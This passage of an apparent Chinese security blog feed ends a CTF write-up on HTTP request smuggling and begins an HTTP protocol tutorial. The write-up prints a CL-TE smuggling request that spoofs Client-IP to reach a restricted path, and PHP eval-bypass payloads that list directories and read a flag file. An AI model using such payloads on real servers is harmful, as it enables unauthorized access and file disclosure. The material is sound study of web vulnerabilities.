alt="在这里插入图片描述"></p><p>点击超链接跳转到/secret，发现响应包中提示需要<code>client-ip</code>头</p><p><img src="https://img-blog.csdnimg.cn/20210206224349121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>将client-ip改为127.0.0.1，发现还是不行，猜测是反代会将真实ip带到后面，抓包看到服务器是ATS/7.1.2，反代服务器本版存在HTTP Smuggling CL-TE 漏洞，可以利用HTTP请求走私</p><p>构造请求包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>hrs.localhost<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>73<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br>0<br><br><span class="hljs-keyword">GET</span> <span class="hljs-string">/secret</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>hrs.localhost<br><span class="hljs-attribute">Client-IP</span><span class="hljs-punctuation">: </span>127.0.0.1<br></code></pre></td></tr></table></figure><p>由于没有赛后复现没有环境，贴一张其他大师傅的wp</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202105/02/225619-18140.png" alt="image-20210502225618544"></p><p><strong>[RoarCTF 2019]Easy Calc</strong><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190649-214946.png" alt="题目"><br>calc.php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在phpifo页面中发现禁用了一些函数和字符，所以尝试绕过，可以利用请求走私。</p><p>利用CL-CL漏洞，返回400错误,同时可以看到phpinfo页面<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191236-584099.png" alt="CL-CL-phpinfo"><br><code>getcwd()</code>:获取到当前工作目录/var/www/html<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191456-261196.png" alt="getcwd"><br><code>var_dump(scandir(dirname(__FILE__)))</code>：获取当前目录下的文件<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191607-151742.png" alt="dir"><br><code>print_r(scandir(chr(47)))</code>：扫描根目录<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191701-2570.png" alt="ls"><br><code>var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code>：读取flag<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191814-959740.png" alt="flag"><br>同样利用CL-TE漏洞同样可以读取flag<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/192008-795497.png" alt="cl-te"></p><h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>在前端服务器通过同一网络连接将多个请求转发到后端服务器的情况下，会出现HTTP请求走私漏洞，并且后端连接所使用的协议会带来两个服务器不同意边界的风险。要求。防止HTTP请求走私漏洞的一些通用方法如下：</p><ul><li>禁用后端连接的重用，以便每个后端请求通过单独的网络连接发送。</li><li>使用HTTP / 2进行后端连接，因为此协议可防止对请求之间的边界产生歧义。</li><li>前端服务器和后端服务器使用完全相同的Web服务器软件，以便它们就请求之间的界限达成一致。</li></ul><p>在某些情况下，可以通过使前端服务器规范歧义请求或使后端服务器拒绝歧义请求并关闭网络连接来避免漏洞。但是，这些方法比上面确定的通用缓解措施更容易出错。</p><p>参考文章：<br><a href="https://paper.seebug.org/1048">https://paper.seebug.org/1048</a><br><a href="https://portswigger.net/web-security/request-smuggling">https://portswigger.net/web-security/request-smuggling</a><br><a href="https://portswigger.net/web-security/request-smuggling/exploiting">https://portswigger.net/web-security/request-smuggling/exploiting</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：HTTP请求走私漏洞学习&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="WEB" scheme="http://atkx.top/categories/CTF/WEB/"/>
    
    
    <category term="漏洞复现" scheme="http://atkx.top/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>HTTP协议</title>
    <link href="http://atkx.top/2021/04/11/HTTP%E5%8D%8F%E8%AE%AE/"/>
    <id>http://atkx.top/2021/04/11/HTTP%E5%8D%8F%E8%AE%AE/</id>
    <published>2021-04-11T06:30:15.000Z</published>
    <updated>2021-08-15T03:59:06.547Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：深入学习HTTP协议</p> <a id="more"></a><h1 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h1><h2 id="HTTP协议简介"><a href="#HTTP协议简介" class="headerlink" title="HTTP协议简介"></a>HTTP协议简介</h2><p>超文本传输协议 (HTTP-Hypertext transfer protocol) 是一种详细规定了浏览器和万维网服务器之间互相通信的规则，通过因特网传送万维网文档的数据传送协议。通常，由HTTP客户端发起一个请求，建立一个到服务器指定端口（默认是80端口）的TCP连接。HTTP服务器则在那个端口监听客户端发送过来的请求。一旦收到请求，服务器（向客户端）发回一个状态行，比如”HTTP/1.1 200 OK”，和（响应的）消息，消息的消息体可能是请求的文件、错误消息、或者其它一些信息。HTTP使用TCP而不是UDP的原因在于（打开一个）一个网页必须传送很多数据，而TCP协议提供传输控制，按顺序组织数据，和错误纠正。</p><p>从层次的角度看，HTTP是面向事务的(transaction-oriented)应用层协议，它是万维网上能够可靠地交换文件(包括文本、声音、图像等各种多媒体文件)的重要基础。</p><p>交互过程如下：<br><img src="https://img-blog.csdnimg.cn/20210329204302530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>http协议思维导图<br><img src="https://img-blog.csdnimg.cn/20210409104101378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="HTTP协议特点"><a href="#HTTP协议特点" class="headerlink" title="HTTP协议特点"></a>HTTP协议特点</h2><p>1.基于请求/响应模型的协议。</p><ul><li>请求和响应必须成对，先有请求后有响应</li></ul><p>2.简单快速</p><ul><li>客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。每种方法规定了客户与服务器联系的类型不同。由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快。</li></ul><p>3.灵活</p><ul><li>HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记。</li></ul><p>4.无连接</p><ul><li>每次请求一次，释放一次连接。所以无连接表示每次连接只能处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。</li></ul><p>5.无状态</p><ul><li>HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。</li></ul><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p>HTTP是基于客户/服务器模式，且面向连接的。典型的HTTP事务处理有如下的过程分为四步：<br>（1）客户与服务器建立连接<br>　　首先客户机与服务器需要建立连接。只要单击某个超级链接，HTTP的工作就开始了。<br>（2）客户向服务器提出请求<br>　　建立连接后，客户机发送一个请求给服务器，请求方式的格式为：统一资源标识符（URL）、协议版本号，后边是MIME信息包括请求修饰符、客户机信息和可能的内容。<br>（3）服务器接受请求，并根据请求返回相应的文件作为应答<br>　　服务器接到请求后，给予相应的响应信息，其格式为一个状态行，包括信息的协议版本号、一个成功或错误的代码，后边是MIME信息包括服务器信息、实体信息和可能的内容。<br>（4）客户与服务器关闭连接<br>　　 客户端接收服务器所返回的信息通过浏览器显示在用户的显示屏上，然后客户机与服务器断开连接。</p><p>　　如果在以上过程中的某一步出现错误，那么产生错误的信息将返回到客户端。　　</p><h2 id="HTTP协议发展史"><a href="#HTTP协议发展史" class="headerlink" title="HTTP协议发展史"></a>HTTP协议发展史</h2><h3 id="HTTP-0-9"><a href="#HTTP-0-9" class="headerlink" title="HTTP/0.9"></a>HTTP/0.9</h3><p>0.9版本是第一个定稿的HTTP版本，相对较为简陋。它有以下特点：</p><ul><li><p>只接受 GET 一种请求方法</p></li><li><p>没有header等描述数据的信息</p></li><li><p>服务器发送完毕，就关闭TCP连接</p></li></ul><p>由于该版本不支持 POST 方法，所以客户端无法向服务器传递太多信息</p><h3 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP/1.0"></a>HTTP/1.0</h3><p>1.0版本在0.9版本上做出了很多创新和优化，该版本：</p><ul><li><p>增加了新的命令（POST命令和HEADER命令）</p></li><li><p>增加status code（状态码）和header</p></li><li><p>增加多字符集支持、多部分发送、authorization（权限）、cache（缓存）等</p></li></ul><p>这是第一个在通讯中指定版本号的HTTP 协议版本，在这个版本，基本实现了HTTP协议的框架。</p><h3 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP/1.1"></a>HTTP/1.1</h3><p>1.1版本解决了大量1.0版本的痛点，该版本新增了以下功能：</p><ul><li><p>持久连接（keep alive）</p></li><li><p>管道化（pipeline）</p></li><li><p>host和其他一些命令</p></li></ul><h3 id="HTTP-2-0"><a href="#HTTP-2-0" class="headerlink" title="HTTP/2.0"></a>HTTP/2.0</h3><p>HTTP2.0的前身是HTTP1.0和HTTP1.1,是HTTP 协议的第二个主要版本，该版本关注于减少延迟时间，从而提高页面加载速度。HTTP/2 是基于 SPDY 协议的，打开一个 TCP 连接并重复使用，这使得许多请求得以并行发送，而无需等待响应。</p><p>HTTP/2.0优势是:</p><ul><li><p>所有数据二进制传输</p></li><li><p>同一链接多个请求不再按照顺序来</p></li><li><p>头信息压缩以及推送等提高效率的功能</p></li></ul><h1 id="HTTP报文格式"><a href="#HTTP报文格式" class="headerlink" title="HTTP报文格式"></a>HTTP报文格式</h1><p>用于HTTP协议交互的信息被称为报文。</p><p>请求端（客户端）的HTTP报文叫做请求报文，响应端（服务器端）的叫做响应报文。HTTP报文本身是由多行数据构成的字符串文本。HTTP报文大致上可分为报文首部和报文主体两块，两者由最初出现的空行来划分。<br>通常来说，并不一定要有报文主体。</p><p>HTTP报文由三部分组成：</p><p>（1)起始行：<br>报文的第一行就是起始行,用于区分是请求报文还是响应报文，请求报文中开始行叫做请求行，而响应报文中，开始行叫做状态行。在开始行的三个字段之间都用空格分开，结尾处 CRLF 表示回车和换行。</p><p>（2)首部行：<br>起始行后面有零个或多个字段。每个字段都包含一个名字和一个值,为了便于解析,两者之间用冒号(:)来分隔，首部以一个空行结束。<br>用于说明浏览器、服务器或报文主体的一些信息。在每一个首部行中都有首部字段名和它的值，每一行在结束的地方都要有“回车”和“换行”。整个首部行结束时，还有以空行将首部行和后面的实体分开。</p><p>（3)主体：<br>空行之后就是可选的报文主体了，其中包含了所有类型的数据。请求主体是要发送给服务器的数据;响应主体是要返回给客户端的数据。在请求报文中一般不用这个字段，而在响应报文中也可能没有这个字段。</p><h2 id="Request请求报文"><a href="#Request请求报文" class="headerlink" title="Request请求报文"></a>Request请求报文</h2><blockquote><p>  HTTP请求报文——从客户向服务器发送请求报文</p></blockquote><p>  HTTP的请求报文由三部分组成 : 请求行 , 首部行和实体 , 如下图 :<br><img src="https://img-blog.csdnimg.cn/20210328202511308.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>请求行：请求行由请求方法字段、URL字段和HTTP协议版本字段3个字段组成，它们用空格分隔。比如 GET /data/info.html HTTP/1.1。方法字段就是HTTP使用的请求方法，比如常见的GET/POST</li><li>请求头：浏览器向服务器发送请求的时候必须指明请求类型(一般是GET或者 POST)。如有必要，客户程序还可以选择发送其他的请求头。大多数请求头并不是必需的，但Content-Length除外。对于POST请求来说 Content-Length必须出现。</li><li>实体：若方法字段是GET，则此项为空，没有数据。若方法字段是POST,则通常来说此处放置的就是要提交的数据</li></ul><h3 id="请求报文实例"><a href="#请求报文实例" class="headerlink" title="请求报文实例"></a>请求报文实例</h3><p>抓包本地搭建的登陆页面，得到请求头：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /<span class="hljs-built_in">test</span>/login.html HTTP/1.1        <span class="hljs-comment">#请求方法为POST，请求URL为/test/login.html，HTTP协议版本为HTTP/1.1</span><br>Host: 127.0.0.1<span class="hljs-comment">#客户机通过这个头告诉服务器，想访问的主机名</span><br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0  <span class="hljs-comment">#指定用户代理服务器的类型。</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2   <span class="hljs-comment">#指出客户浏览器支持的语言是英语（english）</span><br>Accept-Encoding: gzip, deflate        <span class="hljs-comment">#指出发送此请求的浏览器支持哪些压缩编码方式。</span><br>Content-Type: application/x-www-form-urlencoded      <span class="hljs-comment">#表示后面的文档属于什么MIME类型</span><br>Content-Length: 26 <span class="hljs-comment">#表示内容长度</span><br>Origin: http://127.0.0.1     <span class="hljs-comment">#Origin主要是用来说明最初请求是从哪里发起的；</span><br>Connection: close         <span class="hljs-comment">#是在告知服务器本浏览器不想使用永久连接方式（HTTP/1.0使用非永久连接，HTTP/1.1默认使用永久连接）。</span><br>Referer: http://127.0.0.1/<span class="hljs-built_in">test</span>/index.html   <span class="hljs-comment">#客户机通过这个头告诉服务器，它是从哪个资源来访问服务器的</span><br>Cookie: _ga=GA1.1.1592130974.1616653076; bdshare_firstime=1616653211943       <span class="hljs-comment">#客户机通过这个头可以向服务器带数据</span><br>Upgrade-Insecure-Requests: 1        <span class="hljs-comment">#表示能读懂服务器发过来的上面这条信息</span><br><br>username=<span class="hljs-built_in">test</span>&amp;password=123     <span class="hljs-comment">#请求数据</span><br></code></pre></td></tr></table></figure><h3 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h3><p>方法字段指出客户请求服务器执行的一般操作。HTTP/1.1中定义了八种请求方法，其中GET、POST、HEAD、是常用请求方法。</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>GET</td><td>获取一个URL指定的资源,即资源实体。</td></tr><tr><td>POST</td><td>传输实体主体,向服务器提交数据。</td></tr><tr><td>HEAD</td><td>获取一个指定资源的信息,类似GET方法，区别在于只返回报文首部，不返回报文主体。</td></tr><tr><td>PUT</td><td>向服务器提交资源,用来传输文件。</td></tr><tr><td>DELETE</td><td>请求源服务器删除Request-URI标识的资源,用来删除文件。</td></tr><tr><td>TRACE</td><td>网络跟踪</td></tr><tr><td>CONNECT</td><td>与PROXY之间的连接管理,要求用隧道协议连接代理。</td></tr><tr><td>OPTIONS</td><td>查询能力,询问支持方法返回服务器支持的方法。</td></tr></tbody></table><p><strong>GET和POST之间的区别</strong></p><p>1、GET方法的数据参数是暴露在起始行的URL中的，而POST方法的数据参数是在报文主体中的。<br>2、GET方法相对来说没有POST安全，因为它的数据参数可以直接从URL中获取，但是GET的效率更高。<br>3、GET方法的数据参数大小有一定的限制（1024）（原因也是因为它的数据参数是放在URL中的），而POST对数据大小是没有限制的。<br>其实他们的本质区别是GET是从服务器上请求数据，而POST是向服务器发送数据</p><h3 id="请求报文属性"><a href="#请求报文属性" class="headerlink" title="请求报文属性"></a>请求报文属性</h3><p>请求头部为请求报文添加了一些附加信息，由“名/值”对组成，每行一对，名和值之间使用冒号分隔</p><p>常见请求头如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">Client-IP：提供了运行客户端的机器的IP地址<br><br>From：提供了客户端用户的E-mail地址<br><br>Host：给出了接收请求的服务器的主机名和端口号<br><br>Referer：提供了包含当前请求URI的文档的URL，服务器能知道你是从哪个页面过来的<br><br>UA-Color：提供了与客户端显示器的显示颜色有关的信息<br><br>UA-CPU：给出了客户端CPU的类型或制造商<br><br>UA-OS：给出了运行在客户端机器上的操作系统名称及版本<br><br>User-Agent：将发起请求的应用程序名称告知服务器 <br>      <br>Accept：告诉服务器能够发送哪些媒体类型<br><br>Accept-Charset：告诉服务器能够发送哪些字符集<br><br>Accept-Encoding：告诉服务器能够发送哪些编码方式<br><br>Accept-Language：告诉服务器能够发送哪些语言<br><br>TE：告诉服务器可以使用那些扩展传输编码<br><br>Expect：允许客户端列出某请求所要求的服务器行为<br><br>Range：如果服务器支持范围请求，就请求资源的指定范围<br><br>Cookie：客户端用它向服务器传送数据<br><br>Cookie2：用来说明请求端支持的cookie版本<br><br>Upgrade-Insecure-Requests：表示能读懂服务器发过来的上面这条信息，并且在以后发请求的时候不用http而用https<br></code></pre></td></tr></table></figure><h2 id="Response响应报文"><a href="#Response响应报文" class="headerlink" title="Response响应报文"></a>Response响应报文</h2><blockquote><p>  HTTP响应报文——从服务器到客户的回答</p></blockquote><p>   HTTP的请求报文由三部分组成 : 状态行 、 首部行和实体 , 如下图 :<br><img src="https://img-blog.csdnimg.cn/20210328202534215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>响应行：响应行一般由协议版本、状态码及其描述组成 比如 HTTP/1.1 200 OK。其中协议版本HTTP/1.1或者HTTP/1.0，200就是它的状态码，OK则为它的描述。</li><li>响应头：响应头用于描述服务器的基本信息，以及数据的描述，服务器通过这些数据的描述信息，可以通知客户端如何处理等一会儿它回送的数据。</li><li>响应体：响应体就是响应的消息体，如果是纯数据就是返回纯数据，如果请求的是HTML页面，那么返回的就是HTML代码，如果是JS就是JS代码，如此之类。<h3 id="响应报文实例"><a href="#响应报文实例" class="headerlink" title="响应报文实例"></a>响应报文实例</h3>抓包本地搭建的登陆页面，得到响应头：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">HTTP/1.1 200 OK   <span class="hljs-comment">#HTTP协议及版本 状态码</span><br>Date: Mon, 29 Mar 2021 02:57:52 GMT  <span class="hljs-comment">#服务器创建并发送本响应消息的日期和时间。</span><br>Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45  <span class="hljs-comment">#服务器和版本号</span><br>Last-Modified: Mon, 29 Mar 2021 02:57:07 GMT  <span class="hljs-comment">#对象本身的创建或最后修改日期或时间</span><br>ETag: <span class="hljs-string">&quot;8e-5bea4098d63cb&quot;</span>   <span class="hljs-comment">#缓存相关的头</span><br>Accept-Ranges: bytes  <span class="hljs-comment">#标识自身支持范围请求(partial requests)</span><br>Content-Length: 142  <span class="hljs-comment">#所发送对象的字节数</span><br>Connection: close    <span class="hljs-comment">#处理完这次请求后是否断开连接还是继续保持连接</span><br>Content-Type: text/html  <span class="hljs-comment">#包含在实体中的对象是HTML文本</span><br><br>&lt;!DOCTYPE html&gt;    <span class="hljs-comment">#实体部分</span><br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>    &lt;title&gt;succsss&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>Login succsss!!!<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="响应状态码"><a href="#响应状态码" class="headerlink" title="响应状态码"></a>响应状态码</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status">HTTP 响应代码</a>，状态代码由服务器发出，以响应客户端对服务器的请求。</p><p>请求报文的方法字段是对所请求对象进行的操作，而响应报文的状态码是一个 3 位数字，可以分为以下 5 类 ：</p><table><thead><tr><th>状态码类别</th><th>描述</th></tr></thead><tbody><tr><td>1xx</td><td>收到请求，继续处理。</td></tr><tr><td>2xx</td><td>请求已成功接收，理解和接受</td></tr><tr><td>3xx</td><td>重定向到其它地方</td></tr><tr><td>4xx</td><td>客户的差错，请求包含错误的语法或无法满足。</td></tr><tr><td>5xx</td><td>服务器的差错，服务器无法满足明显有效的请求</td></tr></tbody></table><p>常见的状态码：</p><table><thead><tr><th>状态码</th><th>描述</th><th>说明</th></tr></thead><tbody><tr><td>200</td><td>OK</td><td>表示从客户端发送给服务器的请求被正常处理并返回</td></tr><tr><td>204</td><td>No Content</td><td>表示客户端发送给客户端的请求得到了成功处理，但在返回的响应报文中不含实体的主体部分</td></tr><tr><td>301</td><td>Moved Permanently</td><td>永久重定向，表示请求的资源被分配了新的URL，之后应使用更改的URL。</td></tr><tr><td>302</td><td>Found</td><td>临时重定向，表示请求的资源被分配了新的URL，希望本次访问使用新的URL。</td></tr><tr><td>304</td><td>Not Modified</td><td>缓存文件并未过期，还可继续使用，无需再次从服务端获取</td></tr><tr><td>400</td><td>Bad Request</td><td>客户端请求有语法错误，不能被服务器识别</td></tr><tr><td>401</td><td>Unauthorized</td><td>未经许可，需要通过HTTP认证</td></tr><tr><td>403</td><td>Forbidden</td><td>服务器接收到请求，但是拒绝提供服务。</td></tr><tr><td>404</td><td>Not Found</td><td>请求资源不存在</td></tr><tr><td>500</td><td>Internal Server Error</td><td>服务器内部错误</td></tr><tr><td>503</td><td>Server Unavailable</td><td>服务器暂时不能处理客户端的请求</td></tr></tbody></table><h3 id="响应报文属性"><a href="#响应报文属性" class="headerlink" title="响应报文属性"></a>响应报文属性</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xml">Age：(从最初创建开始)响应持续时间<br><br>Public：服务器为其资源支持的请求方法列表<br><br>Retry-After：如果资源不可用的话，在此日期或时间重试<br><br>Server：服务器应用程序软件的名称和版本<br><br>Title：对HTML文档来说，就是HTML文档的源端给出的标题<br><br>Warning：比原因短语更详细一些的警告报文<br><br>ETag：一个代表响应服务端资源（如页面）版本的报文头属性，如果某个服务端资源发生变化了，这个ETag就会相应发生变化。<br><br>Accept-Ranges：对此资源来说，服务器可接受的范围类型<br><br>Vary：服务器会根据这些首部的内容挑选出最适合的资源版本发送给客户端<br><br>Proxy-Authenticate：来自代理的对客户端的质询列表<br><br>Set-Cookie：服务端可以设置客户端的Cookie，以便服务器对客户端进行标识。<br><br>Set-Cookie2：与Set-Cookie类似<br><br>WWW-Authenticate：来自服务器的对客户端的质询列表<br><br></code></pre></td></tr></table></figure><h1 id="HTTP协议实战练习"><a href="#HTTP协议实战练习" class="headerlink" title="HTTP协议实战练习"></a>HTTP协议实战练习</h1><p>题目来自CTFhub靶场：Web前置技能-HTTP协议</p><h2 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h2><p>HTTP 请求方法, HTTP/1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。</p><p><img src="https://img-blog.csdnimg.cn/20210329161254214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>方法一：<br>burpsite抓包，自定义CTFHUB方法请求 index.php 即可拿到 flag。<br><img src="https://img-blog.csdnimg.cn/20210329161305347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>方法二：<br>使用curl命令查看服务器的返回信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -v -X CTFHUB challenge-9661cba9e188a4c8.sandbox.ctfhub.com:10080/index.php<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210329162918897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="302跳转"><a href="#302跳转" class="headerlink" 